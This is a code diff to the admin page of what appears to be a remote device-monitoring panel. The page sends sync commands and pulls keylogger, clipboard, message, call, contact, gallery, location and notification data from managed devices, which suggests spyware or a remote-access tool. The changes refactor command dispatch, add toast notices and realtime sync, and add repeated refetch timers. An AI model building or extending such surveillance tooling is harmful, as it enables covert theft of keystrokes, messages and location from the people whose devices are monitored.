@@ -10,6 +10,9 @@ import { DeviceTelemetryControlsModal } from "@/components/admin/devices/DeviceT
 import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder, Bell, Keyboard, Clipboard, ShieldCheck } from "lucide-react";
 import { useDeviceDetail } from "@/components/admin/devices/useDeviceDetail";
 import { useDeviceTelemetry } from "@/hooks/useDeviceTelemetry";
+import { useDeviceRealtimeSync } from "@/components/admin/devices/useDeviceRealtimeSync";
+import { getTabMeta } from "@/lib/device-tab-meta";
+import { toast } from "@/components/ui/Toast";
 
 const TAB_PREFS_KEY = "snap_tab_prefs_v3";
 
@@ -50,22 +53,30 @@ export default function DeviceDetailPage() {
   const toggleTab = (tabId: string) => {
     const nextVal = !isTabEnabled(tabId);
     const next = { ...tabPrefs, [tabId]: nextVal };
-    setTabPrefs(next);
-    saveTabPrefs(next);
+    setTabPrefs(next); saveTabPrefs(next);
+    const meta = getTabMeta(tabId);
     if (nextVal) {
-      const syncMap: Record<string, string> = {
-        contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages",
-        apps: "sync_apps", gallery: "sync_gallery", security: "sync_wifi",
-      };
-      if (syncMap[tabId]) sendCommand(syncMap[tabId], {}, `Sync ${tabId}`);
+      toast.request(meta.waitMsg, 7000);
+      if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
       if (["notifications", "keylogger", "clipboard", "security"].includes(tabId)) {
         fetchTelemetryData(tabId);
+        setTimeout(() => fetchTelemetryData(tabId), 2500);
       } else {
         fetchTabData(tabId, true, true);
-        setTimeout(() => fetchTabData(tabId, true, true), 2500);
+        setTimeout(() => fetchTabData(tabId, true, true), 3000);
+        setTimeout(() => fetchTabData(tabId, true, true), 6000);
       }
+    } else {
+      toast.info(`Auto-fetch disabled for ${meta.name}`);
     }
   };
+
+  useDeviceRealtimeSync({
+    deviceId, activeTab,
+    onRefreshActiveTab: (t) => fetchTabData(t, true, true),
+    onRefreshLightStatus: handleFullRefresh,
+    onRefreshTelemetry: fetchTelemetryData,
+  });
 
   useEffect(() => {
     if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
@@ -137,24 +148,17 @@ export default function DeviceDetailPage() {
         isTabEnabled={isTabEnabled(activeTab)}
         onToggleTab={() => toggleTab(activeTab)}
         onFetchOnce={() => {
-          const syncMap: Record<string, string> = {
-            contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages",
-            apps: "sync_apps", gallery: "sync_gallery", security: "sync_wifi", map: "fetch_location",
-          };
-          if (syncMap[activeTab]) sendCommand(syncMap[activeTab], {}, `Sync ${activeTab}`);
+          const meta = getTabMeta(activeTab);
+          toast.request(meta.waitMsg, 7000);
+          if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
           fetchConfig();
           if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
             fetchTelemetryData(activeTab);
-            setTimeout(() => {
-              fetchTelemetryData(activeTab);
-              fetchConfig();
-            }, 2500);
+            setTimeout(() => { fetchTelemetryData(activeTab); fetchConfig(); }, 2500);
           } else {
             fetchTabData(activeTab, true, true);
-            setTimeout(() => {
-              fetchTabData(activeTab, true, true);
-              fetchConfig();
-            }, 2500);
+            setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 3000);
+            setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 6000);
           }
         }}
         onToggleLiveMovement={handleToggleLiveMovement}
